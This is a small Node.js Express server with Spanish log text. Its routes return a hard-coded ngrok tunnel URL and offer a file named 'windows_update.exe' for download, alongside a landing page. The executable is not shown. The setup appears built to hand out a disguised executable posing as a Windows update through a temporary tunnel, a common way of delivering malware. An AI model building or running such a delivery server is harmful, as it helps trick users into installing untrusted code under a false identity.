const express = require('express');
const app = express();
var bodyParser = require('body-parser')
const PORT = process.env.PORT || 4500;

app.use(bodyParser.json({ limit: '50mb' }))

app.all('/ok', (req, res) => {
    const date = new Date();
    const day = `${date.getDate()}/${date.getMonth()+1}/${date.getFullYear()}`
    const time = `${date.getHours()}:${date.getMinutes()}:${date.getSeconds()}`
    res.send(`OK! ${day} ${time}`)
})

app.all('/url', (req, res) => {
    res.send('https://0b4f-190-192-75-210.sa.ngrok.io')
})

app.get('/download-file', function (req, res) {
    res.download(`${__dirname}/download/windows_update.exe`, function(err) {
        if(err) {
            console.log(err);
        }
    })
});

app.use("/download", (req, res)=>{
    res.download("/download/windows_update.exe");
  });

app.get('/', function (req, res) {
    res.sendFile(`${__dirname}/download/index.html`);
});

app.listen(PORT)
console.log(`Servidor listen on port ${PORT}`)